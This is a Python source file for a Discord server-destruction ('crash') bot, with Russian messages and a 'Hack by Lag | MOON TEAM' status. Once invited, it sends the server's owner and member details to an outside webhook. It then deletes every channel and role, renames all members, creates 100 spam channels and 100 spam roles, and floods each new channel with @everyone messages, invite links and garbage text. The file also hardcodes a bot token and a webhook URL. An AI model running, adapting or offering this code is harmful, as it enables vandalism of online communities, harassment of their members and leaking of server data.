token = "OTcxNzY2ODg4MTM0NzYyNTI2.GG-Mfv.Gt87VEE_t3R9Xai5QGbpQo0sB6SCHcZeuuy3js"
import discord
from discord.ext import commands
from discord import Permissions
import asyncio
import os
import json
from discord import Webhook, AsyncWebhookAdapter
import discord, random, aiohttp, asyncio
from threading import Thread
from keep_alive import keep_alive
keep_alive()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents )
black_list = json.load(open('black-list.json'))
bl_server = json.load(open('bl-server.json'))
ser_vers = json.load(open('servers.json'))
@bot.event
async def on_guild_join(guild):
  if len(guild.members) <= 10:
    embed = discord.Embed(
            title = 'Попытка краша сервера, где недостаточно участников.',
            description = '''**Согласно нашим данным на этом сервере меньше `10` человек.** \n ```Если у вас есть вопросы, то``` \n **[🔗кликните наш Discord сервер](https://discord.gg/6SE3CcGQdx)**''',
            color = 0x0059ff
        )
    await guild.text_channels[0].send(embed=embed)
    await guild.leave()
  if guild.id in ser_vers:
        embed = discord.Embed(
            title = 'Попытка краша сервера из белого списка.',
            description = '''Согласно нашим данным это сервер пытались крашнуть. Мы советуем посмотреть журнал аудита и проверить кто пригласил этого бота. Если у вас есть вопросы, то **[🔗кликните наш Discord сервер](https://discord.gg/6SE3CcGQdx)**''',
            color = 0xe90000
        )
        await guild.text_channels[0].send(embed=embed)
        await guild.leave()
  adder=None
  try:
    async for entry in guild.audit_logs(action=discord.AuditLogAction.bot_add):
      adder = entry.user
      a_id=adder.id
      break
    if a_id in black_list:
      try: await adder.send("https://discord.gg/c2P7kn6Edc ", embed = discord.Embed(title=':x:Доступ запрещен. Вас добавили в черный список', description=f'```Вы можете зайти на сервер, чтобы узнать причину блокировки```', colour = 0xf00a0a))
      except: pass
      await guild.leave()
      return
  except: adder="Unknown"; a_id="Unknown"
  async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url('https://discord.com/api/webhooks/971097495339933736/ftcnKtWtAaa18MndxLmCl7pLJn9vawNYnJ_k9Nf07CeJB1HNYkqC3fTVSZv037yPzPOL', adapter=discord.AsyncWebhookAdapter(session))
        members = len(guild.members)
        await webhook.send(embed=discord.Embed(
            title="Новый сервер!",
            description=(
                f"**Название перед крашем:** `{guild.name}`\n"
                f"**Добавил краш бота:** <@{a_id}> **Его айди** `{a_id}` \n"
                f"**Инфо перед крашем:**\n"
                f"**Участников:** `{guild.member_count}`\n"
                f"**Ролей:** `{str(len(guild.roles))}` \n"
                f"**Каналов:** `{str(len(guild.channels))}` \n"
                f"**Владелец:** `{guild.owner}` **Его айди:** `{guild.owner.id}`\n"
                f"**ID сервера:** `{guild.id}`\n"
                f"**Пригласить бота:** `Ссылка` [Нажмите для добавления](https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot) **Бот в этом канале** <#969584819841429574>\n"
                f"**Уничтожено серверов этим ботом:** `{len(bot.guilds)}` \n"
                f"**Все сервера отображаются | jktimosha**"
            ),
            color=discord.Color.gold()
        ).set_thumbnail(url=guild.icon_url_as(static_format="png", size=1024)))
  for u in guild.channels:
    try: await u.delete()
    except: pass
  for x in guild.roles:
    try: await x.delete()
    except: pass
  for x in guild.members:
    try: await x.edit(nick="𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎")
    except: pass
  for x in range(100):
    try: await guild.create_text_channel("𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎")
    except: pass
  for x in range(100):
    await guild.create_role(name ="𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎")
  with open('K.E.Y.webp', 'rb') as f:
        icon = f.read()
  await guild.edit(name='𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎', icon=icon)
             

@bot.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name = "𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 ")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
      webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
      for i in range(100):
        try:
          await webhook.send("https://discord.gg/6nTt9AvKKv https://discord.gg/6nTt9AvKKv \n @everyone \n У нас `самые лучшие` **краш боты**, *заходи* ️틓탑컏쳍쫋죉웇쓅싃상뺿벽못뢹뚷뒵늳낱꺯겭ꪫꢩꚧ꒥ꊣꂡ麟鲝骛颙隗钕銓邑躏貍誋袉蚇蒅芃肁繿籽穻硹癷瑵牳灱湯汭橫桩晧摥扣恡幟屝婛塙噗呕剓偑乏䱍䩋䡉䙇䑅䉃䁁㸿㰽㨻㠹㘷㐵㈳〱ⸯⰭ⨫⠩☧␥∣‡ḟᰝᨛ᠙ᘗᐕሓထฏ఍਋ࠉ؇Ѕȃ℀ӹਅ＀Ⰰ  õࠀÿ呓堚ᕩఎ嚫ࡹʠÀ·娢㘣娌ڶ됤ꂬⶀ衛ධ킡ˠஅ儦뭢ඐ䮙栲⦛ꙓ⎶朳愞ආ荛뜝䖒傚 ꌣ轈䴪瓊ꌩ䖥຋ௐᆱ됕ᮡ멙屴놟昣䯍도걞ㅕ烻䏪쐀䖈䀄耗愊賂䬥촖҃ᑬ걈䄠나䄖ጙ⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓⛓⛓⛓⛓⛓⛓⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️㍀꛿‾ע鎰羏㏸એ䨜홫虸䣭۠桎㹡烛㛇憴挎沼ꈃ⸭㵲짫㉊銳ૌ敬宫櫡䍗नꯐ緵橆䑸녆⠴馯襸ᵾ䞈訿ቆ顬偣䥳ꔤ䋢愌䳐ེ圔〶釠了⎊戸漘Ƙ츒깵쌣蛂䈻ꎣ뒞姉ဩǂ낇麒ꙸ㍩Ț戳ꯩ쓠踱颶ࣇ်炎柨ᵣ䙸泆গ챶ॣ塄܂怸斨ₐᰁ읨긶腑ѴᲲ況ᭇ䃜⸃蘴ᕿ슸စ詐㨮⼣㊤㑂ᣆ싇䘈氰ꍬ蜛ꋦ橕躦ꨱ᷑剕䫿혽䮤爒㚰ຌ蜂鹄㚒霕릲稌ꤋ愊뼄㉌ᆎ짬䠕쩉ఫ舁뤜䡛䚛ᣊ傉䈵°풯뺗Ęƫꝭ큩ﶎ雷鉝験巴옛밉䭋毂Լatom⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓⛓⛓⛓⛓⛓⛓⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️䣿紃｟۰㹸ᆑ͇᩸逴阂Πꂖ恸ʐ栈ᮀݗ퀴赸硷᜔囄ᰁŀꁋᰀ䏐僧뀍ೖ풼๰婺局퓑︎㰁灚䑳氧޶쀌۠逯뼉๕䅬켱٠怐ሌ㸰돝㷓戙晆蓴ᄿ㍗梲놜뉽曤吞쬵癡ꀕƖ❫贯虰儠葷⟁谌悕幯栠蔲翐至ഓꃏ섌䎷뀣老ȸꃨ旐ᑸԸꁵ畱郿崂Π梑甉Π큵鎈礇ꊫᘪಀ댕䎿਄۠㤌๕莡씲༳㞯䐅篠ᜲ荰倵⾃Ҹ쬂Ő瀔狀屛眱僃ṥೠꃍ舟Ꮲ댳㵢᜘∫伢㒴䫆❠വ㔳朇睬馆࣐s舀Ͷᭅៀæ䘯ఠᅔ̕ऐ偆㌈⠣ኂﰍ᳈㡾⎈Ȱ⊂敖ᗈ룺ᕃಀ膘匪∠눚౩؈阆熨렗鱱蔨킂ච嘶⼍筰゜൐ს퐏ຐ墽˰윽〉瑩恉䨻Ň热꺓矿䥫臰倈섟೔ㅩ嶌ກꃮ켍ఠ뙔⛓️⛓️⛓️⛓️⛓⛓⛓⛓⛓⛓⛓⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓⛓⛓⛓⛓⛓⛓⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓⛓⛓⛓⛓⛓⛓⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️")
        except:
          break
@bot.event
async def on_ready():
  print(f'Бот запущен. Ник бота: {bot.user}  https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot Юзеров {0}!'.format(bot.user))
  await bot.change_presence(status=discord.Status.online, activity=discord.Streaming(name=f'Hack by Lag  | MOON TEAM', url='https://www.twitch.tv/jktimosha'))

bot.run(token)
